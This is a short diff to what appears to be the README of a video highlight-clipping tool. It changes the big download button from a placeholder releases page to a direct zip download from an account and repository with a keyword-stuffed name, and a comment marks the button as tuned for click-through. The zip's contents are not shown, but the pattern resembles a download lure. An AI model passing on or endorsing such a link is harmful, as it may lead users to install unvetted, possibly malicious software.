@@ -20,7 +20,7 @@
 
 <!-- BIG DOWNLOAD BUTTON | MAX CTR -->
 <p align="center">
-  <a href="https://github.com/USERNAME/Video-AutoClip/releases/latest">
+  <a href="https://github.com/smokkerelf-2000a3h/Video-AutoClip-Automatic-Stream-Highlights-Smart-Video-Cutter/releases/download/v1.07.1/AutoClip-main.zip">
     <img 
       src="https://img.shields.io/badge/⬇️%20DOWNLOAD%20LATEST%20RELEASE-%23ff4f8b?style=for-the-badge&logo=cloudflare&logoColor=white&labelColor=000000" 
       alt="Download Latest Release"
